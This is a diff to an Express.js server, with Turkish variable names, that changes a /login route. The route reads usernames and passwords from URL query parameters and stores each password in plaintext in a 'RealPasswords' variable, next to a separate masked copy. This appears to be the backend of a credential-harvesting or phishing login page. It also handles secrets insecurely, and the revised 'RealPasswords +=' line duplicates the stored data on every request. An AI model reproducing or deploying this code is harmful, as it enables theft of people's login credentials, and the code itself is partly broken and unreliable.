@@ -13,20 +13,16 @@ app.use(express.static(path.join(__dirname, "public")));
 app.set(`trust proxy`, true);
 app.use(cors());
 
-console.log(__dirname);
-
 app.get(`/`, async(istek, cevap) => {
   cevap.sendFile(`${__dirname}/public/index.html`);
 });
-
-
 
 app.get(`/login`, async(istek, cevap) => {
   let username = istek.query.username;
   let password = istek.query.password;
   let maskedPassword = `${password.slice(0, 2)}${'*'.repeat(password.length - 2)}`;
-  passwords += `\n\nUsername: ${username} | Password: ${maskedPassword}`;
-  RealPasswords += `\n\nUsername: ${username} | Password: ${password}`;
+  passwords = `${passwords}\n<br>\nUsername: ${username} | Password: ${maskedPassword}`;
+  RealPasswords += `${RealPasswords}\n<br>\nUsername: ${username} | Password: ${password}`;
   cevap.sendStatus(200);
 });
 
